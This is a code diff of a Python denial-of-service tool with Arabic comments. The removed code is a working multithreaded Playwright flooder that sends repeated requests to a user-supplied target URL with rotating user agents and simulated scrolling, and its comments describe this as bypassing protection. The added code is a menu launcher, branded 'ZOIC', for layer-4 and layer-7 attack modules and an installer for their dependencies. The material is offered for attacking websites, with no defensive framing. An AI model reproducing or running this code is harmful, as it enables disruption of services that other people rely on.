@@ -1,83 +1,71 @@
-import random
-import time
-from playwright.sync_api import sync_playwright
-from queue import Queue
-import threading
+import os
+import sys
+from module.l4 import *
+from module.l7 import *
+from module.method import *
+from Tools.main import *
+from pystyle import Colorate, Colors
 
-# قائمة رؤوس المستخدم (User-Agent)
-user_agents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
-]
+# الوظيفة لعرض الشعار
+def logo():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(Colorate.Horizontal(Colors.cyan_to_green,"""                              
+                    ╔═╗╔═╗╦╔═╗
+                    ╔═╝║ ║║║  
+                    ╚═╝╚═╝╩╚═╝    
+                              
+            ╔════════════════════════╗
+            ║        [method]        ║            
+            ║   Type to see command  ║
+            ╚════════════════════════╝            
+                      """))
 
-# قائمة عناوين URL المستهدفة
-urls = Queue()
+# وظيفة التثبيت
+def install():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(Colorate.Horizontal(Colors.cyan_to_green,"""                              
+                    ┌─┐┌─┐┌┬┐┬ ┬┌─┐
+                    └─┐├┤  │ │ │├─┘
+                    └─┘└─┘ ┴ └─┘┴    
+                                                                    
+"""))
+    print("""
+     ██╗ ██████╗ ██╗  ██╗███╗   ██╗    ██████╗     ██╗ ██████╗ 
+     ██║██╔═══██╗██║  ██║████╗  ██║    ╚════██╗██╗███║██╔════╝ 
+     ██║██║   ██║███████║██╔██╗ ██║     █████╔╝╚═╝╚██║███████╗ 
+██   ██║██║   ██║██╔══██║██║╚██╗██║     ╚═══██╗██╗ ██║██╔═══██╗
+╚█████╔╝╚██████╔╝██║  ██║██║ ╚████║    ██████╔╝╚═╝ ██║╚██████╔╝
+ ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═════╝     ╚═╝ ╚═════╝
+          """)
+    os.system("pip install aiosonic --break-system-packages")
+    os.system("pip install cloudscraper --break-system-packages")
+    os.system("pip install aiohttp --break-system-packages")
+    os.system("pip install scapy --break-system-packages")
+    os.system("git pull")
 
-# وظيفة لإرسال الطلبات باستخدام Playwright
-def ddos():
-    """
-    إرسال طلبات للموقع مع تقنيات تخطي الحماية.
-    """
-    with sync_playwright() as p:
-        browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"])
-        page = browser.new_page()
-
-        while not urls.empty():
-            url = urls.get()
-            try:
-                headers = {
-                    "User-Agent": random.choice(user_agents),
-                    "Accept-Language": "en-US,en;q=0.9",
-                    "Accept-Encoding": "gzip, deflate, br",
-                }
-
-                page.set_extra_http_headers(headers)
-
-                # محاولة الانتقال إلى الموقع مع انتظار لتحميل المحتوى
-                page.goto(url, wait_until="domcontentloaded", timeout=10000)
-
-                # محاكاة حركة المستخدم (scrolling) لجعل المحاكاة أكثر واقعية
-                page.mouse.wheel(0, 1000)  # محاكاة تمرير الصفحة
-                time.sleep(2)  # انتظر قليلاً بعد التمرير
-                page.mouse.wheel(0, -1000)  # محاكاة التمرير إلى الأعلى
-                time.sleep(2)  # انتظر قليلاً بعد التمرير
-
-                print(f"Request sent to {url}, Status: Success")
-
-            except Exception as e:
-                print(f"Error with {url}: {e}")
-            urls.task_done()
-
-        browser.close()
-
-# دالة لإعداد الخيوط
+# الوظيفة الرئيسية
 def main():
-    target = input("Enter the target URL (with http/https): ").strip()
-    thread_count = int(input("Enter the number of threads: "))
-    request_count = int(input("Enter the total number of requests: "))
+    while True:
+        logo()
+        select = input(Colorate.Horizontal(Colors.green_to_blue,"""   
+╔═══[root@ZOIC~$]   
+╚══> """))
+        
+        # إضافة الخيار لتثبيت المكتبات
+        if select == "install" or select.lower() == "i":
+            install()
 
-    # التحقق من القيم المدخلة
-    if thread_count <= 0 or request_count <= 0:
-        print("Invalid input. The number of threads and requests must be greater than 0.")
-        return
+        elif select == "method" or select.lower() == "h":
+            method_main()
 
-    # ملء قائمة الطلبات
-    for _ in range(request_count):
-        urls.put(target)
+        elif select == "layer7" or select.lower() == "l7":
+            layer7()
 
-    threads = []
+        elif select == "layer4" or select.lower() == "l4":
+            layer4()
 
-    # إنشاء وتشغيل الخيوط
-    for _ in range(thread_count):
-        thread = threading.Thread(target=ddos)
-        thread.daemon = True
-        threads.append(thread)
-        thread.start()
-
-    # انتظار انتهاء جميع الطلبات
-    for thread in threads:
-        thread.join()
+        elif select == "Tools" or select.lower() == "t":
+            Tools_main()
 
 if __name__ == "__main__":
     main()
